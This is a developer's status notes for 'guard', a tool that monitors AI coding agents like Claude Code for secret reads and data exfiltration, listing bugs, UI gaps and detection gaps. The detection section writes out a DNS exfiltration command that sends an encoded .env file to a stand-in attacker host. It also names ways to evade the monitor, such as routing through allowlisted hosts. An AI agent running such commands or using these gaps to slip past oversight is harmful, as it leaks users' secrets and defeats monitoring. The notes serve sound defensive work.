# What's left

State as of the last session. Ranked by what actually hurts, not by what is
easiest — the bugs at the top are things the product currently claims to do and
does not.

---

## 1. Bugs: promised behaviour that does not work

### 1.1 Learned preferences are lost on daemon restart

`audit.Engine` keeps preferences in memory. `store.PutPreference` writes them to
SQLite, and **nothing ever reads them back**. `brain.New` starts with an empty
set every time.

So "Always allow this" survives until the next `guard up`, then silently stops
applying. The developer is asked again about something they already approved,
with no indication why — which is exactly the failure Article XI is meant to
prevent.

- `core/engine/audit/engine.go` — needs a load path
- `core/cmd/guard/daemon.go` — wire it at startup
- Test: teach a preference, restart the daemon, assert it still applies

### 1.2 A resumed session carries stale capabilities and stays marked ended

`Session.End()` sets `Ended = true` and nothing else. It does not clear
capabilities, and nothing ever clears `Ended`.

Claude Code reuses the same `session_id` on `--resume`. A resumed session
therefore keeps every capability from before *and* is permanently flagged as
ended. `docs/RUNTIME_MODEL.md` §3.1 claims capabilities "reset only on
SESSION_END" — they never reset at all.

Decide which is true before fixing it. Carrying capabilities across a resume is
arguably *correct* (it is the same agent, the same secrets, the same machine) —
in which case the doc is wrong, not the code. Either way they must agree.

- `core/domain/session.go`
- Test: end a session, ingest another signal with the same id

### 1.3 The `Observe` RPC is dead

`server.Observe` is implemented and no adapter calls it. POST-phase signals go
through `Decide`, which means every observation consumes the decision path —
budgeted for verdicts that can be blocked — to produce an `ALLOW` nobody reads.

Either wire the adapter to it, or delete it. A streaming RPC that exists only in
the proto is a claim the code does not back.

- `adapters/shared/src/client.ts`, `adapters/claude-code/src/index.ts`

---

## 2. Broken promises in the UI

### 2.1 `guard resume` and `guard deny` do not exist

Every PAUSE tells the developer to run them:

> `Session paused. Run `guard resume` to continue, or allowlist …`

Neither command is implemented, and there is no pending-prompt queue behind
them. A PAUSE is currently a dead end: the call is refused and nothing can
un-refuse it.

Needs a pending queue in the daemon, `Resolve` reachable from the CLI, and the
two commands.

### 2.2 `guard learned` cannot list anything

It prints a count. `guard revoke <id>` needs an id the developer has no way to
obtain. Article XI requires learned rules to be *listable* and revocable.

---

## 3. Detection gaps

Known holes, in rough order of how much they matter. All are documented in the
README under "What it does not catch" — keep that list honest as these change.

- **DNS exfiltration.** `nslookup $(base64 .env).evil.example` scores only on
  the prior secret read. Nothing understands port 53; with no prior read it
  scores zero. Needs the adapter to recognise resolver tools and treat a
  hostname carrying encoded data as egress.
- **Allowlisted destination is a bypass.** A −40 mitigation, so routing through
  an allowlisted host is the cheapest evasion available. Consider making the
  mitigation not apply once `data_egress` and `secret_access` are both latched.
- **Bare pipes.** `cat .env | some-tool` is caught only if the tool's own flags
  give it away.
- **No content inspection**, by design. Worth revisiting only if behaviour alone
  proves insufficient on real sessions.

Add every new evasion to `scripts/redteam.py` before fixing it, so the fix has
something to prove itself against.

---

## 4. Untested

### 4.1 Risk and Decision engines have no unit tests

The two engines carrying the most judgment are covered only indirectly, through
`e2e.sh` and `redteam.py`. Both go through the whole stack, so a failure points
at the stack rather than at the engine.

Wanted: confidence gating (high score + low confidence must not escalate),
policy floor/ceiling conflict resolution, the irreversibility gate, preference
scoping, and the fail-open path when an explanation cannot be built.

### 4.2 ANSI in `systemMessage` is unverified

`claude -p` never surfaces `systemMessage` — not in plain output, not in
`stream-json`. Whether Claude Code renders escape sequences there interactively
is unknown. If it does not, developers see raw escape codes.

Check in a real interactive session. The CLI colour path is verified.

---

## 5. Not built

- **Local dashboard.** Deliberately last (Article X: APIs before UI).
- **Adapters** for Codex, Gemini, Cursor, MCP. The shared package and the
  `Signal` contract exist; each needs a mapping table and a verdict translator.
- **Policy files.** The Policy Engine works, but policies can only be authored
  in Go — `defaultPolicies()` in `daemon.go`. Needs a workspace-level file.
- **Workspace config.** `defaultWorkspace()` hardcodes the allowlist. A
  developer cannot add a host without recompiling, which makes the guidance
  "allowlist this host for the workspace" another promise the CLI cannot keep.

---

## 6. Model calibration

The weights in `core/config/weights.json` are a first honest guess, tuned
against invented scenarios and one real session. They will be wrong for real
workflows before they are right.

The one measured data point so far: separating "reached a host" from "sent data"
moved a benign fetch from 63/100 (interrupting) to 43/100 (silent), with the
real exfiltration case unchanged at 100.

`guard replay` exists for exactly this. Record real sessions, change a weight,
replay, and read the diff. Do not tune against `redteam.py` alone — a model
fitted to its own test suite has learned the suite, not the threat.

One known irritant: reading a config file then running any shell command lands
on exactly 20, the NOTIFY threshold. Deliberately left alone rather than tuned,
because moving a threshold to make a self-authored table go green is how a test
suite starts measuring itself.
